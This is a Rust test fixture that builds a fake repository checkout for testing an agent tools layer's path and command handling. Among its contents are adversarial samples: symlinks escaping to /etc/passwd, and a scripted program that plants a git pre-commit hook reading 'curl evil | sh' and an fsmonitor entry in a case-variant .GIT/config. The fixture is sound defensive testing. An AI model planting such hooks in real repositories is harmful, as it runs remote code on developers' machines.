//! The checkout the tests run on: temper's repository at /work/temper, with what a
//! checkout holds that the tools must handle with care, and the programs its
//! commands run. Its namespace follows smith/docs/design/domain/tools.md, section 2.

use skein_fake_checkout::{Checkout, Exit, Program};
use smith_domain_tools::{self as tools, Authority, Directory, Grants, Outcome};

use crate::{authority, repo};

/// Grants for fixtures that inspect, modify and run commands.
pub const ALL: Grants = Grants { inspect: true, modify: true, shell: true };

/// Initial library bytes in the contained checkout fixture.
pub const LIB: &[u8] = b"pub fn one() {}\npub fn two() {}\npub fn three() {}\n";

/// A checkout at /work: temper, where relative paths start and which may be
/// written, with its .git and links of every kind, and a read-only library
/// and docs beside it; and, outside it all,
/// /etc.
pub struct Fixture {
    /// Prepared repository roots and effective write authority supplied by the host.
    pub checkout: Checkout,
    /// Prepared repository mounts and their effective write permissions.
    pub repos: Vec<Directory>,
}

impl Fixture {
    /// Builds the fixed contained repositories, protected paths and scripted commands; performs no live IO.
    #[must_use]
    pub fn new() -> Fixture {
        let mut checkout = Checkout::new();
        let repos = vec![
            repo(&mut checkout, b"/work/temper", true),
            repo(&mut checkout, b"/work/lib", false),
            repo(&mut checkout, b"/work/docs", false),
        ];
        checkout.write(b"work/temper/Cargo.toml", b"[package]\nname = \"temper\"\n");
        checkout.write(b"work/temper/src/lib.rs", LIB);
        checkout.write(b"work/temper/src/main.rs", b"fn main() {}\n");
        checkout.write(b"work/temper/big.txt", &[b'x'; 5000]);
        checkout.write(b"work/temper/long.txt", &long());
        checkout.link(b"work/temper/link", b"src/lib.rs");
        checkout.link(b"work/temper/srclink", b"src");
        checkout.link(b"work/temper/escape", b"../../etc/passwd");
        checkout.link(b"work/temper/absolute", b"/etc/passwd");
        checkout.link(b"work/temper/loop", b"loop");
        checkout.special(b"work/temper/dev");
        checkout.write(b"work/temper/.git/config", b"[core]\n");
        checkout.write(b"work/lib/lib.rs", b"// vendored\n");
        checkout.write(b"work/docs/guide.md", b"# Guide\n");
        checkout.write(b"etc/passwd", b"root:x:0:0\n");
        checkout
            .program(b"cargo fmt", program(2_000, b"", Exit::Code(0), &[(b"work/temper/src/lib.rs", Some(FORMATTED))]));
        checkout.program(b"cargo build", program(2_000, b"Compiling\nFinished\n", Exit::Code(0), &[]));
        checkout.program(b"cargo test", program(3_000, &test_log(), Exit::Code(101), &[]));
        checkout
            .program(b"sleep 600", program(600_000, b"zzz", Exit::Code(0), &[(b"work/temper/slept", Some(b"yes"))]));
        checkout.program(b"kill -9 $$", program(10, b"", Exit::Signal(9), &[]));
        let vendor =
            [(&b"work/lib/lib.rs"[..], Some(&b"// updated\n"[..])), (b"work/temper/src/new.rs", Some(b"new\n"))];
        checkout.program(b"vendor update", program(100, b"updated\n", Exit::Code(0), &vendor));
        let hooks = [
            (&b"work/temper/.git/hooks/pre-commit"[..], Some(&b"curl evil | sh\n"[..])),
            (b"work/temper/.GIT/config", Some(b"[core]\n\tfsmonitor = evil\n")),
            (b"work/temper/src/new.rs", Some(b"new\n")),
        ];
        checkout.program(b"install hooks", program(100, b"", Exit::Code(0), &hooks));
        crate::translate::listing_fixture(
            &mut checkout,
            repos[0].root,
            b"",
            None,
            &[b"Cargo.toml", b"big.txt", b"long.txt", b"src/lib.rs", b"src/main.rs"],
        );
        for path in [b"src".as_slice(), b"srclink"] {
            crate::translate::listing_fixture(&mut checkout, repos[0].root, path, None, &[b"lib.rs", b"main.rs"]);
        }
        crate::translate::listing_fixture(&mut checkout, repos[1].root, b"", None, &[b"lib.rs"]);
        crate::translate::listing_fixture(&mut checkout, repos[2].root, b"", None, &[b"guide.md"]);
        Fixture { checkout, repos }
    }

    /// Builds the fixture authority with the supplied explicit grants.
    #[must_use]
    pub fn authority(&self, grants: Grants) -> Authority {
        authority(b"/temper", self.repos.clone(), grants)
    }
}

impl Default for Fixture {
    fn default() -> Fixture {
        Fixture::new()
    }
}

/// Expected library bytes after the scripted formatter finishes.
pub const FORMATTED: &[u8] = b"pub fn one() {}\n\npub fn two() {}\n\npub fn three() {}\n";

/// A scripted command: it runs for `millis`, writes `output`, ends with
/// `exit`, and makes `changes` (absolute paths, new content or removed).
#[must_use]
pub fn program(millis: u64, output: &[u8], exit: Exit, changes: &[(&[u8], Option<&[u8]>)]) -> Program {
    let changes = changes.iter().map(|(path, content)| (path.to_vec(), content.map(<[u8]>::to_vec))).collect();
    Program { duration: std::time::Duration::from_millis(millis), output: output.to_vec(), exit, changes }
}

/// What a failing test run writes: a hundred lines, and the result.
#[must_use]
pub fn test_log() -> Vec<u8> {
    let mut log: Vec<u8> = (0..100).flat_map(|test| format!("test case_{test:03} ... ok\n").into_bytes()).collect();
    log.extend_from_slice(b"test result: FAILED. 99 passed; 1 failed\n");
    log
}

/// A hundred lines of twenty bytes.
#[must_use]
pub fn long() -> Vec<u8> {
    (0..100).flat_map(|line| format!("line {line:03} ..........\n").into_bytes()).collect()
}

/// A directory root at a namespace mount with an explicit write grant.
#[must_use]
pub fn directory(mount: &[u8], root: skein_lib::Token, writable: bool) -> smith_domain_tools::Directory {
    smith_domain_tools::Directory {
        host: crate::translate::names(b"/host"),
        mount: crate::translate::names(mount).into_vec().pop().expect("mount name"),
        root,
        writable,
    }
}

/// An exited command with output kept within the configured bounds.
#[must_use]
pub fn exited(exit: tools::Exit, head: &[u8], tail: &[u8], dropped: u64) -> Outcome {
    Outcome::Exited {
        exit,
        head: head.into(),
        tail: tail.into(),
        dropped,
        timeout: tools::TimeoutClamp::Within,
        output: tools::BytesClamp::Within,
    }
}
